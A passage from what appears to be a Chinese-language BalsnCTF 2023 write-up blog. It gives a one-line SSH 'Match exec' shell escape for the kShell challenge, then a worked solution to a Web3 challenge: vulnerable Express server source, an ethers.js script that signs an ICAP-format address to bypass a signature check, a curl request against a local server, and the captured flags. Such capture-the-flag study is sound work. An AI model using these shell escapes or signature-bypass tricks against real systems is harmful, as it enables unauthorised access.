</span></span></code></pre></div>這個解法更省力，誠如作者所說，如果config file是一個fd呢?它就會直接讓我們輸入東西當成它的configuration，所以只要下跟上面一樣的command就會跳出來，不過@itiscaleb是直接執行然後印出來，不知道這樣的操作為啥會成功，如果是我的話會直接用<code>Match exec "sh 0&lt;&amp;2 1>&amp;2</code>跳出來再執行/readflag
Flag: <code>BALSN{h0w_d1d_u_g3t_RCE_on_my_kSSHell??}</code></li></ul><h4 id=reference-2>Reference
<a class=anchor href=#reference-2>#</a></h4><h3 id=web3four>Web3:four:
<a class=anchor href=#web3four>#</a></h3><h4 id=background-2>Background
<a class=anchor href=#background-2>#</a></h4><ul><li><p><a href=https://cypherpunks-core.github.io/ethereumbook_zh/05.html>ethereumbook 第五章 密要、地址</a></p><blockquote><p>互換客戶端地址協議（ICAP）是一種部分與國際銀行帳號（IBAN）編碼兼容的以太坊地址編碼，為以太坊地址提供多功能，校驗和互操作編碼。ICAP地址可以編碼以太坊地址或通過以太坊名稱註冊表註冊的常用名稱。</p><p>閱讀以太坊Wiki上的ICAP：https://github.com/ethereum/wiki/wiki/ICAP:-Inter-exchange-Client-Address-Protocol</p><p>IBAN是識別銀行帳號的國際標準，主要用於電匯。它在歐洲單一歐元支付區（SEPA）及其以後被廣泛採用。IBAN是一項集中和嚴格監管的服務。ICAP是以太坊地址的分散但兼容的實現。</p><p>一個IBAN由含國家程式碼，校驗和和銀行帳戶識別碼（特定國家）的34個字母數字字符（不區分大小寫）組成。</p><p>ICAP使用相同的結構，通過引入代表“Ethereum”的非標準國家程式碼“XE”，後面跟著兩個字符的校驗和以及3個可能的帳戶識別碼變體</p></blockquote></li><li><p><a href="https://learnblockchain.cn/docs/ethers.js/api-utils.html?highlight=getaddress#id14">ethers.js 工具包 - getaddress</a></p><blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>address</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0xd115bffabbdd893a6f7cea402e7338643ced44a6&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>icapAddress</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;XE93OF8SR0OWI6F4FO88KWO4UNNGG1FEBHI&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>utils</span>.<span style=color:#a6e22e>getAddress</span>(<span style=color:#a6e22e>address</span>));
</span></span><span style=display:flex><span><span style=color:#75715e>// &#34;0xD115BFFAbbdd893A6f7ceA402e7338643Ced44a6&#34;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>utils</span>.<span style=color:#a6e22e>getAddress</span>(<span style=color:#a6e22e>icapAddress</span>));
</span></span><span style=display:flex><span><span style=color:#75715e>// &#34;0xD115BFFAbbdd893A6f7ceA402e7338643Ced44a6&#34;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>utils</span>.<span style=color:#a6e22e>getAddress</span>(<span style=color:#a6e22e>address</span>, <span style=color:#66d9ef>true</span>));
</span></span><span style=display:flex><span><span style=color:#75715e>// &#34;XE93OF8SR0OWI6F4FO88KWO4UNNGG1FEBHI&#34;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>utils</span>.<span style=color:#a6e22e>getAddress</span>(<span style=color:#a6e22e>icapAddress</span>, <span style=color:#66d9ef>true</span>));
</span></span><span style=display:flex><span><span style=color:#75715e>// &#34;XE93OF8SR0OWI6F4FO88KWO4UNNGG1FEBHI&#34;
</span></span></span></code></pre></div></blockquote></li><li><p><a href=https://learnblockchain.cn/docs/ethers.js/api-wallet.html#signer>Wallet Signer工具包</a></p></li><li><p><a href="https://learnblockchain.cn/docs/ethers.js/api-utils.html?highlight=verifymessage#id18">ethers.js 工具包 - verifyMessage</a></p><blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>signature</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0xddd0a7290af9526056b4e35a077b9a11b513aa0028ec6c9880948544508f3c63265e99e47ad31bb2cab9646c504576b3abc6939a1710afc08cbf3034d73214b81c&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>signingAddress</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Wallet</span>.<span style=color:#a6e22e>verifyMessage</span>(<span style=color:#e6db74>&#39;hello world&#39;</span>, <span style=color:#a6e22e>signature</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>signingAddress</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>// &#34;0x14791697260E4c9A71f18484C9f997B308e59325&#34;
</span></span></span></code></pre></div></blockquote></li></ul><h4 id=source-code-3>Source code
<a class=anchor href=#source-code-3>#</a></h4><p>:::spoiler server.js</p><pre tabindex=0><code class="language-javascript=" data-lang="javascript=">const express = require(&#34;express&#34;);
const ethers = require(&#34;ethers&#34;);
const path = require(&#34;path&#34;);

const app = express();

app.use(express.urlencoded());
app.use(express.json());

app.get(&#34;/&#34;, function(_req, res) {
  res.sendFile(path.join(__dirname + &#34;/server.js&#34;));
});

function isValidData(data) {
  if (/^0x[0-9a-fA-F]+$/.test(data)) {
    return true;
  }
  return false;
}

app.post(&#34;/exploit&#34;, async function(req, res) {
  try {
    const message = req.body.message;
    const signature = req.body.signature;
    if (!isValidData(signature) || isValidData(message)) {
      res.send(&#34;wrong data&#34;);
      return;
    }

    const signerAddr = ethers.utils.verifyMessage(message, signature);
    if (signerAddr === ethers.utils.getAddress(message)) {
      const FLAG = process.env.FLAG || &#34;get flag but something wrong, please contact admin&#34;;
      res.send(FLAG);
      return;
    }
  } catch (e) {
    console.error(e);
    res.send(&#34;error&#34;);
    return;
  }

  res.send(&#34;wrong&#34;);
  return;
});

const port = process.env.PORT || 3000;
app.listen(port);
console.log(`Server listening on port ${port}`);
</code></pre><p>:::</p><h4 id=recon-3>Recon
<a class=anchor href=#recon-3>#</a></h4><p>這一題是賽後解，因為太難了所以沒解出來，不過還是非常有趣的題目</p><ol><li>Recon
仔細觀察soure code會發現，先用post到/exploit的route，然後帶message和signature的data，兩者都會受到檢查，也就是要符合signature=0xabcd&mldr;，而message就是一般的字元，所以看到#30~#31就會知道，這一題難的地方在於要想辦法找到一個message，他簽名後的錢包地址要和message本身一模一樣才會過條件拿到flag，也就是message也要是一個地址才行，但卻不能是0x開頭</li><li>根據<sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup>和<sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup>的範例就會知道乙太錢包的地址有支援ICAP格式，簡單來說就是另外一種表示方式，一般錢包地址的表示都是採用hex的形式表示，但ICAP是以XE字節開頭表示地址，如下範例所示：<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>ethers</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;ethers&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>wallet</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ethers</span>.<span style=color:#a6e22e>Wallet</span>.<span style=color:#a6e22e>createRandom</span>()
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>ethers</span>.<span style=color:#a6e22e>utils</span>.<span style=color:#a6e22e>getAddress</span>(<span style=color:#a6e22e>wallet</span>.<span style=color:#a6e22e>address</span>))
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>ethers</span>.<span style=color:#a6e22e>utils</span>.<span style=color:#a6e22e>getIcapAddress</span>(<span style=color:#a6e22e>wallet</span>.<span style=color:#a6e22e>address</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span> <span style=color:#ae81ff>0x7165ac4B3cb187CC37278919254db9e0867F1f26</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span> <span style=color:#a6e22e>XE68D8UVUZEGBBSCAHT3O1HW4VN63MD31GM</span>
</span></span></code></pre></div></li><li>所以我們可以想如果直接拿地址的變形，也就是ICAP的地址當作我們的message，則簽名後得到的signAddress也一樣會是原本的錢包地址，而丟到getAddress的message因為本身就是地址，所以return的字串也會是一般以hex表示的錢包地址</li></ol><h5 id=原本的想法一點都不重要>原本的想法(一點都不重要)
<a class=anchor href=#%e5%8e%9f%e6%9c%ac%e7%9a%84%e6%83%b3%e6%b3%95%e4%b8%80%e9%bb%9e%e9%83%bd%e4%b8%8d%e9%87%8d%e8%a6%81>#</a></h5><p>直接暴力搜message簽完名後和message一樣
:::spoiler 爛扣</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>ethers</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;ethers&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span>  <span style=color:#a6e22e>generateRandomString</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>num</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>result1</span><span style=color:#f92672>=</span> Math.<span style=color:#a6e22e>random</span>().<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>36</span>).<span style=color:#a6e22e>substring</span>(<span style=color:#ae81ff>2</span>,) <span style=color:#f92672>+</span> Math.<span style=color:#a6e22e>random</span>().<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>36</span>).<span style=color:#a6e22e>substring</span>(<span style=color:#ae81ff>2</span>,) <span style=color:#f92672>+</span> Math.<span style=color:#a6e22e>random</span>().<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>36</span>).<span style=color:#a6e22e>substring</span>(<span style=color:#ae81ff>2</span>,) <span style=color:#f92672>+</span> Math.<span style=color:#a6e22e>random</span>().<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>36</span>).<span style=color:#a6e22e>substring</span>(<span style=color:#ae81ff>2</span>,);       
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>result1</span>.<span style=color:#a6e22e>substring</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>num</span>));
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>result1</span>.<span style=color:#a6e22e>substring</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>num</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>signAndVerify</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>privateKey</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0x3141592653589793238462643383279502884197169399375105820974944592&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>wallet</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ethers</span>.<span style=color:#a6e22e>Wallet</span>(<span style=color:#a6e22e>privateKey</span>);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>{
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span>(<span style=color:#66d9ef>true</span>){
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>message</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>generateRandomString</span>(<span style=color:#ae81ff>40</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>signature</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>wallet</span>.<span style=color:#a6e22e>signMessage</span>(<span style=color:#a6e22e>message</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>signature</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>ethers</span>.<span style=color:#a6e22e>utils</span>.<span style=color:#a6e22e>verifyMessage</span>(<span style=color:#a6e22e>message</span>, <span style=color:#a6e22e>signature</span>));
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;0x&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>message</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>ethers</span>.<span style=color:#a6e22e>utils</span>.<span style=color:#a6e22e>verifyMessage</span>(<span style=color:#a6e22e>message</span>, <span style=color:#a6e22e>signature</span>) <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;0x&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>message</span>){
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;Got it\nThe mssage is: &#34;</span>, <span style=color:#a6e22e>message</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;Nothing Yet&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>error</span>){
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;Errror&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>signAndVerify</span>();
</span></span></code></pre></div><p>:::</p><h4 id=exploit-2>Exploit
<a class=anchor href=#exploit-2>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>ethers</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;ethers&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>wallet</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ethers</span>.<span style=color:#a6e22e>Wallet</span>.<span style=color:#a6e22e>createRandom</span>()
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>ethers</span>.<span style=color:#a6e22e>utils</span>.<span style=color:#a6e22e>getAddress</span>(<span style=color:#a6e22e>wallet</span>.<span style=color:#a6e22e>address</span>))
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>icapAddress</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ethers</span>.<span style=color:#a6e22e>utils</span>.<span style=color:#a6e22e>getIcapAddress</span>(<span style=color:#a6e22e>wallet</span>.<span style=color:#a6e22e>address</span>)
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>icapAddress</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>message</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>icapAddress</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>signature</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>wallet</span>.<span style=color:#a6e22e>signMessage</span>(<span style=color:#a6e22e>message</span>)
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>message</span>, <span style=color:#a6e22e>signature</span>)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ node exp.js
</span></span><span style=display:flex><span>0x7165ac4B3cb187CC37278919254db9e0867F1f26
</span></span><span style=display:flex><span>XE68D8UVUZEGBBSCAHT3O1HW4VN63MD31GM
</span></span><span style=display:flex><span>XE68D8UVUZEGBBSCAHT3O1HW4VN63MD31GM Promise <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;0xf624460a7d73a36edbaf09435856181081e64b82ad0098b70600f55a5d0b24344757ac17f7451df142279abeea25af3dae8d128af5ff48ce5226ac7fc2f591aa1b&#39;</span> <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>$ node server.js    <span style=color:#75715e># 自己開service</span>
</span></span><span style=display:flex><span>$ curl -X POST localhost:3000/exploit --data <span style=color:#e6db74>&#39;message=XE68D8UVUZEGBBSCAHT3O1HW4VN63MD31GM&amp;signature=0xf624460a7d73a36edbaf09435856181081e64b82ad0098b70600f55a5d0b24344757ac17f7451df142279abeea25af3dae8d128af5ff48ce5226ac7fc2f591aa1b&#39;</span>
</span></span><span style=display:flex><span>get flag but something wrong, please contact admin%
</span></span></code></pre></div><p>因為是賽後解，所以就自己開service，但最後的結果確定可以拿到flag</p><p>Flag: <code>BALSN{Inter_Exchange_Client_Address_Protocol}</code></p><h4 id=reference-3>Reference
<a class=anchor href=#reference-3>#</a></h4><h2 id=crypto>Crypto
<a class=anchor href=#crypto>#</a></h2><h3 id=prime>Prime
<a class=anchor href=#prime>#</a></h3><h2 id=web>Web
<a class=anchor href=#web>#</a></h2><h3 id=0fa>0fa
<a class=anchor href=#0fa>#</a></h3><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://hackmd.io/@asef18766/H19LRNSXh#/>asef PPT</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://blog.wu-boy.com/2015/12/a-super-small-docker-image-based-on-alpine-linux/>Alpine Linux 挑戰最小 docker image OS</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href=https://blog.csdn.net/qq_35764295/article/details/126379879>Docker報錯OCI runtime exec failed: exec failed: unable to start container process: exec: &ldquo;/bin/bash"解決</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4><p><a href=https://itiscaleb.com/2023/10/Balsn-CTF-2023/>BalsnCTF 2023 kShell WP</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5><p><a href=https://blog.maple3142.net/2023/10/09/balsn-ctf-2023-writeups/#web3>BalsnCTF 2023 - Web3 WP - maple</a>&#160;<a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:6><p><a href="https://learnblockchain.cn/docs/ethers.js/api-utils.html?highlight=getaddress#id14">ethers.js 工具包 - getaddress</a>&#160;<a href=#fnref:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#reverse>Reverse</a><ul><li><a href=#lucky>Lucky</a></li><li><a href=#merger2077>merger2077</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#kshellfive>kshell:five:</a></li></ul></li><li><a href=#heading><code>docker build -q .</code>是指利用當前目錄的Dockerfile建一個instance，而Dockerfile是based on alpine這個Image，詳細可以看一下這一篇文章，然後針對alpine linux作一些檔案搬運和權限控管，最後會運行<code>/start.sh</code>這個檔案，BTW，-q參數的意義是會把當前已經build好的instance的ID print出來，剛好可以丟給docker run當作instance id用。
當我們build完之後就要run他，並且可以跟我們進行shell的互動(-it)參數的意義，然後開/bin/sh給我們用
:::danger
不可以使用/bin/bash，因為alpine只有支援sh這個shell，否則會出現一些error，詳細可以看這一篇
:::</a><ul><li></li><li><a href=#web3four>Web3:four:</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#prime>Prime</a></li></ul></li><li><a href=#web>Web</a><ul><li><a href=#0fa>0fa</a></li></ul></li></ul></nav></div></aside></main></body></html>